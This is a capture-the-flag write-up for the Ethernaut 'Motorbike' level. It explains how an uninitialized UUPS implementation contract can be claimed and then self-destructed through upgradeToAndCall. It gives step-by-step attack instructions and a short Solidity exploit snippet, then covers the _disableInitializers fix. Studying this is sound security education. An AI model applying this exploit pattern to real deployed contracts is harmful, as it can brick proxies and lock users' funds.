# Level 25: Motorbike

**Target:** [Motorbike.sol](./Motorbike.soll)
**Exploit:** [exploit.sol](./exploit.sol)

## Vulnerability

The UUPS proxy delegates `initialize()` to the Engine (implementation) contract via `delegatecall`, which writes state exclusively to the Proxy's storage. The Engine's own storage remains uninitialized, allowing anyone to call `initialize()` directly on the Engine contract and claim the `upgrader` role.

## Key Concepts

**UUPS Proxy (EIP-1822):** Unlike Transparent Proxy, upgrade logic lives in the implementation contract rather than the proxy. This saves gas by eliminating the per-call admin check but shifts the security burden to the implementation.

**Uninitialized Implementation:** When a proxy calls `initialize()` via `delegatecall`, state changes land in the proxy's storage. The implementation contract's own storage is never touched, leaving it in a virgin state that anyone can claim.

**EIP-6780 (Cancun Upgrade):** Post-March 2024, `selfdestruct` only removes bytecode if executed within the same transaction as contract deployment. This level is effectively deprecated on mainnet and all testnets.

## Root Cause

The Engine contract lacks a constructor-based `_disableInitializers()` call. After deployment, its own storage has `initialized = false` and `upgrader = address(0)`, making it freely claimable by any external caller.

## Exploit

1. Read the EIP-1967 implementation slot (`0x360894...bbc`) from the Proxy to discover Engine's address.
2. Call `Engine.initialize()` directly (not through Proxy) to become the `upgrader`.
3. Deploy a malicious contract containing `selfdestruct(payable(0))`.
4. Call `Engine.upgradeToAndCall(maliciousContract, abi.encodeWithSelector(run.selector))`.
5. Engine delegatecalls into the payload; `selfdestruct` executes in Engine's context, destroying the implementation.
6. The Proxy still holds all user funds but points to a dead address — permanently bricked.

```solidity
// Step 1: Read Engine address from Proxy storage
bytes32 implData = vm.load(proxy, IMPL_SLOT);
address engine = address(uint160(uint256(implData)));

// Step 2: Claim upgrader on uninitialized Engine
IExploit(engine).initialize();

// Step 3-4: Deploy payload and upgrade
address payload = address(new Exploit());
IExploit(engine).upgradeToAndCall(payload, abi.encodeWithSelector(IExploit.run.selector));
```

## Real-World Reference

In September 2021, OpenZeppelin disclosed a critical vulnerability (UUPS Universal Upgradeable Proxy Standard) affecting all UUPS proxy implementations prior to version 4.3.2. The fix introduced `_disableInitializers()` in the implementation constructor, which is now standard practice across all major proxy frameworks.
